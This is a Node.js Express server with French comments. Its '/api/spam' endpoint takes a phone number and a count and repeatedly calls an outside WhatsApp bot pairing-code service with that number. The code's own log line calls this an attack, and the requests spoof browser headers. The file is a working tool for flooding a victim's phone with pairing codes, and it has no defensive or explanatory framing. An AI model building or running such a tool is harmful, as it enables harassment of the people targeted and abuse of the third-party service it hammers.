const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// On sert les fichiers statiques
app.use(express.static(path.join(__dirname, 'public')));

// Route API
app.post('/api/spam', async (req, res) => {
    const { number, count } = req.body;

    if (!number || !count) {
        return res.status(400).json({ error: 'Numéro et nombre requis' });
    }

    console.log(`[${new Date().toISOString()}] Attaque lancée vers ${number} x${count}`);

    let results = [];
    let successCount = 0;
    let failCount = 0;

    try {
        for (let i = 0; i < count; i++) {
            try {
                // Appel avec des headers spécifiques pour éviter le CORS
                const response = await fetch(`https://prabath-md-pair-web-v2-slk.koyeb.app/code?number=${encodeURIComponent(number)}`, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json, text/plain, */*',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Content-Type': 'text/plain;charset=UTF-8'
                    },
                    signal: AbortSignal.timeout(10000) // Timeout de 10 secondes
                });

                // Vérification du statut HTTP
                if (!response.ok) {
                    throw new Error(`Serveur cible a répondu: ${response.status}`);
                }

                // On lit la réponse (même si elle est vide)
                await response.text(); 
                
                results.push({ status: 'OK', time: new Date().toISOString() });
                successCount++;

            } catch (err) {
                results.push({ status: 'Error', error: err.message, time: new Date().toISOString() });
                failCount++;
            }

            // Délai entre les envois
            if (i < count - 1) {
                await new Promise(resolve => setTimeout(resolve, 800));
            }
        }

        res.json({ 
            success: true, 
            message: `${successCount} réussi(s), ${failCount} échoué(s)`, 
            details: results 
        });

    } catch (globalErr) {
        res.status(500).json({ error: 'Erreur critique', details: globalErr.message });
    }
});

app.listen(PORT, () => {
    console.log(`Serveur prêt sur le port ${PORT}`);
});
